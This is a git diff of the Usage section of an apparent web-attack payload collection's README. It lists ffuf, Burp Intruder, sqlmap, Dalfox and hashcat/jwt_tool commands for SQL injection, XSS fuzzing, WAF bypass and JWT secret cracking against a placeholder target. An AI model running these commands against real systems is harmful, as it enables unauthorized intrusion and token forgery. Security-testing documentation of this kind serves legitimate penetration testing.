@@ -68,39 +68,41 @@ git clone https://github.com/ayodyadsr/PayloadBase.git
 ### Usage
 
 **ffuf**
-
 ```bash
-ffuf -u https://target.com/FUZZ -w xss/basic.txt
+ffuf -u https://target.com/FUZZ -w sqli/time-based.txt
+ffuf -u "https://target.com/page?id=FUZZ" -w sqli/boolean.txt
 ```
-
+ 
 **Burp Suite Intruder**
-
 ```
 Load any .txt file directly as Intruder payload list.
 ```
-
-**SQLMap — HTTP GET**
-
+ 
+**SQLMap**
 ```bash
+# GET
 sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --level=3 --risk=1
-```
-
-**SQLMap — HTTP POST**
-
-```bash
+ 
+# POST (from saved request)
 sqlmap -r /tmp/target.txt --technique=T --time-sec=10 --level=3 --risk=1
+ 
+# Header injection
+sqlmap -u "https://target.com/" --technique=T --time-sec=10 --level=5 --risk=3 -p "User-Agent" --random-agent
+ 
+# WAF bypass
+sqlmap -u "https://target.com/page?id=1" --tamper=space2comment,between,randomcase
 ```
-
-**SQLMap — HTTP Header injection**
-
+ 
+**Dalfox (XSS)**
 ```bash
-sqlmap -u "https://target.com/page" --technique=T --time-sec=10 --level=5 --risk=3 -p "User-Agent" --random-agent
+dalfox file xss/reflected.txt --silence
+echo "https://target.com/?q=FUZZ" | dalfox pipe
 ```
-
-**SQLMap — WAF Bypass**
-
+ 
+**JWT crack**
 ```bash
-sqlmap -u "https://target.com/page?id=1" --technique=T --time-sec=10 --tamper=space2comment,between,randomcase
+hashcat -m 16500 <jwt_token> jwt/secrets.txt
+python3 jwt_tool.py <token> -C -d jwt/secrets.txt
 ```
 
 - - -
